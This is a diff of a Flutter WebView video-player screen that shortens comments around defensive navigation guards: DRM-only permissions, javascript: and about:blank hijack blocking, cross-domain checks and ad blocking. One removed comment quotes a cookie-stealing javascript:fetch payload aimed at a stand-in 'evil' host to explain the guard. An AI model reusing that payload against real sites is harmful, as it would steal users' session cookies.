-              // fire callbacks between `_loadProgress.dispose()` and
-              // `super.dispose()`, when `mounted` is still true but the
-              // notifier has already been torn down.
+              // `_disposed` before `mounted` — native callbacks can land
+              // between `_loadProgress.dispose()` and `super.dispose()`.
               if (_disposed || !mounted) return;
-              // Latch once: powers the post-load cross-domain check in
-              // shouldOverrideUrlLoading.
+              // Latch once; gates the cross-domain check below.
               if (progress >= 100) _initialLoadComplete = true;
-              // ValueNotifier — only the progress bar + loading overlay
-              // rebuild, not the whole Scaffold/Stack tree.
               _loadProgress.value = progress.toDouble();
             },
             onUpdateVisitedHistory: (controller, url, isReload) async {
-              // ── Click-jacker about:blank recovery (Windows only) ─────
-              //
-              // Windows WebView2 skips BOTH `shouldOverrideUrlLoading`
-              // AND `onLoadStart` for the synthetic main-frame
-              // navigation that fires after we return `false` from
-              // `onCreateWindow` on a `target="_blank"` anchor click
-              // with `hasGesture: true`. `onUpdateVisitedHistory` is
-              // the earliest callback that fires with the URL.
-              //
-              // The same callback fires for *legitimate* in-page
-              // navigation (server-switch), so we filter strictly on
-              // `about:blank` / `about:` and leave everything else.
-              //
-              // The `_initialLoadComplete` gate the previous version
-              // had is intentionally dropped: streaming sites that SPA-
-              // redirect before progress hits 100 % never latched the
-              // flag, leaving them with no recovery path on about:blank
-              // hijacks. about:blank is never a legitimate main-frame
-              // state for a streaming page — treating it as a hijack
-              // unconditionally is safe.
+              // about:blank click-jacker recovery. This is the earliest
+              // callback WebView2 fires for the hijack — and deliberately
+              // NOT gated on `_initialLoadComplete`. See PLAYER.md
+              // § about:blank click-jacker.
               if (!PlayerPlatform.isWindows) return;
               if (_disposed || !mounted) return;
               final urlStr = url?.toString() ?? '';
@@ -931,19 +701,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               }
             },
             onTitleChanged: (controller, title) async {
-              // ── Microsoft Defender SmartScreen recovery (Windows only) ──
-              //
-              // Some streaming embeds server-side redirect to ad
-              // domains (e.g. brightadnetwork.com). When SmartScreen's
-              // database has the destination flagged, WebView2 replaces
-              // the entire page with its red full-screen
-              // "Reported Unsafe Site: Navigation Blocked" warning. The
-              // page URL stays unchanged but the title flips to a known
-              // SmartScreen string. SmartScreen is a Windows Defender
-              // feature; on every other platform a title coincidentally
-              // containing one of these markers would just be a normal
-              // page (e.g. a documentation site discussing the warning
-              // dialog), so this whole handler is Windows-only.
+              // SmartScreen takeover recovery — the URL stays unchanged
+              // but the title flips to a known marker. Windows-only:
+              // elsewhere such a title is just a normal page.
               if (!PlayerPlatform.isWindows) return;
               if (_disposed || !mounted) return;
               final t = title ?? '';
@@ -991,18 +751,16 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
                     msg.startsWith('Array')) {
                   return;
                 }
-                // On Windows, some sites flood with Bot/Proxy detection logs (Adscore).
+                // Some Windows sites flood with Adscore bot-detection logs.
                 if (PlayerPlatform.isWindows && msg.contains('Adscore')) return;
 
                 debugPrint('WebView: $msg');
               }
             },
             onPermissionRequest: (controller, request) async {
-              // Whitelist: only DRM (Widevine) — required for protected
-              // streaming. Camera, microphone, geolocation, MIDI, etc. are
-              // never needed by a video player and must always be denied.
-              // (PermissionResourceType isn't a real Dart enum, so the set
-              // can't be `const`.)
+              // DRM only. Camera, mic, geolocation, MIDI and the rest are
+              // never needed by a video player. (Not a real enum, so the
+              // set can't be `const`.)
               final allowedResources = <PermissionResourceType>{
                 PermissionResourceType.PROTECTED_MEDIA_ID,
               };
@@ -1029,29 +787,15 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               );
             },
             onCreateWindow: (controller, createWindowAction) async {
-              // We don't open popup windows. Returning false suppresses
-              // the new-window request itself; on Windows WebView2, a
-              // `target="_blank"` anchor click with `hasGesture: true`
-              // then falls back to navigating the CURRENT frame to the
-              // anchor's href. When that href is `about:blank`, the
-              // player gets wiped — caught and recovered in
-              // `onUpdateVisitedHistory` below.
-              //
-              // We tried pre-empting here with a microtask that called
-              // `_recoverFromHijack` before WebView2 could dispatch the
-              // fallback. It backfired: the pre-empt fires *before*
-              // WebView2 has started the about:blank load, so
-              // `stopLoading` is a no-op, the recovery completes
-              // trivially, the cooldown latches, and the *real* recovery
-              // attempt from `onUpdateVisitedHistory` then gets blocked
-              // by the cooldown — leaving the user stuck on about:blank.
+              // No popups. On Windows this triggers WebView2's
+              // navigate-current-frame fallback, recovered in
+              // `onUpdateVisitedHistory`. Do NOT try to pre-empt that here
+              // — see PLAYER.md § A pre-empt attempt that backfired.
               return false;
             },
             shouldOverrideUrlLoading: (controller, navigationAction) async {
-              // The native side can fire this AFTER `dispose()` runs on
-              // Windows; gating on `_disposed` first prevents the
-              // `_providerContainer.read` below from racing the container's
-              // own teardown.
+              // Can fire after `dispose()` on Windows — gate before the
+              // `_providerContainer.read` below races its own teardown.
               if (_disposed) return NavigationActionPolicy.CANCEL;
 
               final urlRequest = navigationAction.request;
@@ -1059,13 +803,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               if (url.isEmpty) return NavigationActionPolicy.ALLOW;
 
               final scheme = urlRequest.url?.scheme ?? '';
-              // Main-frame `javascript:` navigation executes the script in
-              // the current document's origin. Sub-frames legitimately use
-              // `<a href="javascript:void(0)">` as a no-op click target,
-              // so we allow it there — but a main-frame jump to
-              // `javascript:fetch('https://evil/?'+document.cookie)` from
-              // a compromised plugin or hijacked anchor is the textbook
-              // DOM-XSS vector. Cancel it unconditionally.
+              // Main-frame `javascript:` runs in the document's origin —
+              // the textbook DOM-XSS vector. Sub-frames legitimately use
+              // `href="javascript:void(0)"` as a no-op, so allow it there.
               if (navigationAction.isForMainFrame && scheme == 'javascript') {
                 return NavigationActionPolicy.CANCEL;
               }
@@ -1079,30 +819,14 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
                 return NavigationActionPolicy.CANCEL;
               }
 
-              // Click-jacker about:blank guard.
-              //
-              // A common pattern on streaming sites — especially visible
-              // on Windows WebView2 — is an invisible
-              // `<a href="about:blank" target="_blank">` overlaid on top of
-              // the player. The user click fires onCreateWindow (which we
-              // reject by returning false), but WebView2's fallback for a
-              // suppressed `target="_blank"` navigation is to load the
-              // link in the CURRENT frame instead, blanking out the video.
-              //
-              // After the initial load, any main-frame navigation to
-              // about:blank is treated as that hijack and cancelled. Sub-
-              // frames are left alone — some legitimate players use a
-              // brief about:blank intermediate inside iframes.
+              // Click-jacker guard. Sub-frames are left alone — some
+              // players use a brief about:blank intermediate in iframes.
               if (navigationAction.isForMainFrame &&
                   _initialLoadComplete &&
                   (url == 'about:blank' || scheme == 'about')) {
                 return NavigationActionPolicy.CANCEL;
               }
 
-              // Use the cached ProviderContainer directly — `ref.read()`
-              // throws under Riverpod 3.x once the widget element starts
-              // unmounting, and on Windows this callback can fire after
-              // the user has already popped the player route.
               final blocklist =
                   _providerContainer.read(adBlocklistProvider).value ??
                   _providerContainer.read(adBlocklistFallbackProvider);
@@ -1110,15 +834,10 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
                 return NavigationActionPolicy.CANCEL;
               }
 
-              // Cross-domain main-frame guard.
-              //
-              // We use _initialLoadComplete (latched true on the first
-              // progress=100 event) instead of the live _loadProgress, because
-              // a programmatic location.assign('evil.com') triggers
-              // shouldOverrideUrlLoading *while* progress is dropping back to
-              // 0 — gating on `_loadProgress == 100` would let the redirect
-              // through. Once the original page has loaded, every cross-base
-              // main-frame nav is treated as a hijack and cancelled.
+              // Cross-domain main-frame guard. Gated on
+              // `_initialLoadComplete`, not live progress — a programmatic
+              // `location.assign` fires this while progress is dropping
+              // back to 0, so a progress check would let it through.
               if (navigationAction.isForMainFrame &&
                   _initialLoadComplete &&
                   _initialHostBase.isNotEmpty) {
@@ -1133,8 +852,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
             },
             shouldInterceptRequest: PlayerPlatform.useNativeAdBlocking
                 ? (controller, request) async {
-                    // Native side queues callbacks; one may fire after
-                    // dispose. Same rationale as shouldOverrideUrlLoading.
+                    // Queued native callbacks can land after dispose.
                     if (_disposed) return null;
                     final url = request.url.toString();
                     final blocklist =
@@ -1159,8 +877,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   Widget _buildProgressBar() {
     if (_hasError) return const SizedBox.shrink();
-    // ValueListenableBuilder so only this widget rebuilds when progress
-    // changes (previously every percent rebuilt the whole player tree).
+    // ValueListenableBuilder so only this rebuilds on progress change.
     return Positioned(
       top: 0,
       left: 0,
@@ -1184,9 +901,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   Widget _buildLoadingOverlay() {
     if (_hasError) return const SizedBox.shrink();
-    // Only shown during the very first load (progress ≤ 15%).
-    // Wrapped in IgnorePointer so taps pass through to the WebView
-    // even while the spinner is visible — fixes laggy play button.
+    // IgnorePointer so taps still reach the WebView while the spinner is
+    // up — otherwise the play button feels laggy.
     return ValueListenableBuilder<double>(
       valueListenable: _loadProgress,
       builder: (context, progress, _) {
@@ -1208,10 +924,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   // ─── Error State ─────────────────────────────────────────────────────────
 
-  /// [overrideMessage] / [onRetry] let transient errors (e.g. WebView env
-  /// initialisation failure on Windows) render their own message and retry
-  /// behaviour without touching `_hasError`/`_errorMsg`, which are owned by
-  /// the in-WebView load lifecycle.
+  /// [overrideMessage] / [onRetry] let transient errors render their own
+  /// message without touching `_hasError`/`_errorMsg`, which belong to the
+  /// in-WebView load lifecycle.
   Widget _buildErrorState({String? overrideMessage, VoidCallback? onRetry}) {
     return PlayerErrorView(
       message: overrideMessage ?? _errorMsg,
@@ -1229,10 +944,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       active: _overlayActive,
       onPlayNext: _playNextEpisode,
       onDismiss: () {
-        // Flip _showNextEpisodeOverlay so the next build short-circuits at
-        // the top — leaving it `true` keeps the overlay's
-        // `nextEpisodeForProgressProvider` subscription alive even though
-        // the widget is off-screen.
+        // Clearing the flag short-circuits the next build. Leaving it set
+        // would keep the overlay's provider subscription alive off-screen.
         _overlayTimer?.cancel();
         setState(() {
           _showNextEpisodeOverlay = false;
@@ -1248,7 +961,6 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   void _playNextEpisode(int nextSeason, int nextEpisode) {
     if (!mounted) return;
 
-    // Resolve the plugin and new URL before navigating
     final plugins =
         ref.read(pluginsForHookProvider(TriggerHook.mediaHeader)).value ?? [];
     final plugin = PluginUrlResolver.pickPlugin(
@@ -1267,13 +979,10 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
     if (_isNavigating) return;
     _isNavigating = true;
-    // Tell our own dispose() to NOT restore portrait — the new player
-    // route will re-lock landscape in its initState and we'd otherwise
-    // race against it (iOS forces a rotation to whichever
-    // setPreferredOrientations call landed last).
+    // Suppress our own portrait restore — the next player re-locks
+    // landscape in its initState and iOS honours whichever call lands last.
     _navigatingToAnotherPlayer = true;
 
-    // Clean up current webview before navigating to free resources.
     _cleanupWebView();
 
     Future.microtask(() {
@@ -1317,13 +1026,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   Future<void> _toggleFullScreen() async {
     final isFull = await windowManager.isFullScreen();
     await windowManager.setFullScreen(!isFull);
-    // Intentionally NO setState here — the WindowListener (registered in
-    // initState) updates `_isFullScreen` from `onWindowEnterFullScreen` /
-    // `onWindowLeaveFullScreen` once the OS confirms the transition.
-    // Writing here too would race the listener: if the user toggled
-    // fullscreen externally during the awaits above, the listener would
-    // write the correct value first and our `setState(!isFull)` would
-    // clobber it with the value we captured BEFORE the toggle.
+    // No setState — the WindowListener owns `_isFullScreen` and writing
+    // here would clobber it with the pre-toggle value if the user changed
+    // fullscreen externally during the awaits.
   }
 
   // ─── Actions ──────────────────────────────────────────────────────────────
@@ -1337,28 +1042,22 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
         await windowManager.setFullScreen(false);
       }
       if (!mounted) {
-        // The widget is already being torn down; nothing to pop. Reset the
-        // flag so a re-entrant call after a quick rebuild isn't wedged.
+        // Already tearing down; unwedge the flag in case of a re-entrant
+        // call after a quick rebuild.
         _isNavigating = false;
         return;
       }
       context.pop();
     } catch (e) {
-      // Any failure (windowManager error, GoRouter pop refused) must
-      // unwedge the screen so the user can try again.
+      // Unwedge on any failure so the user can try again.
       _isNavigating = false;
       if (kDebugMode) debugPrint('_dismiss failed: $e');
     }
   }
 
   void _retry() {
-    // Reset every piece of latched state that depends on the page-load
-    // lifecycle. The previous implementation only flipped `_hasError`,
-    // leaving the recovery circuit-breaker counter, the per-type cooldown
-    // map, and `_initialLoadComplete` carrying forward — so a user who
-    // tripped the breaker (e.g. SmartScreen loop) could not actually
-    // escape it via the Retry button, and the recovery gates would
-    // misfire as soon as the page started loading again.
+    // Reset EVERY page-load-lifecycle latch — including the breaker and
+    // cooldowns, or a user who tripped the breaker can't escape it here.
     _loadProgress.value = 0;
     _recentRecoveries.clear();
     _lastRecoveryByType.clear();
@@ -1367,10 +1066,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       _hasError = false;
       _errorMsg = '';
     });
-    // Re-issue the original URL on the existing controller. The widget's
-    // `ValueKey` is bound to `widget.url`, which doesn't change, so the
-    // InAppWebView is reused — without this explicit `loadUrl` it would
-    // keep showing the previously-failed page and Retry would be dead UI.
+    // Explicit reload — the `ValueKey` is bound to an unchanged
+    // `widget.url`, so the WebView is reused and would otherwise keep
+    // showing the failed page.
     unawaited(
       _controller?.loadUrl(urlRequest: URLRequest(url: WebUri(widget.url))),
     );
